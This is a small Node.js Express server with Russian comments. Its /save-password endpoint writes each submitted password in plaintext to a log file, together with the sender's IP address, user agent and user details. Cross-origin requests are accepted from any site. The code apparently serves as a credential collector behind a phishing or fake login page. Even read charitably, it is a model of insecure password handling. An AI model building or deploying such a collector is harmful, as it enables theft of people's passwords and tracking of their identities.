const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const os = require('os');
const requestIp = require('request-ip');
const cors = require('cors'); // Добавьте эту строку

const app = express();
const port = 3001;

app.use(bodyParser.json());
app.use(requestIp.mw());
app.use(cors()); // Добавьте эту строку

app.post('/save-password', (req, res) => {
  try {
    const { password, userInformation } = req.body;

    const logData = `${new Date().toISOString()} - IP: ${req.clientIp}, UserAgent: ${
      req.get('user-agent')
    }, Password: ${password}, User Information: ${JSON.stringify(
      userInformation
    )}${os.EOL}`;

    fs.appendFileSync('passwords.log', logData);

    res.status(200).json({ success: true, message: 'Password saved successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Internal Server Error' });
  }
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
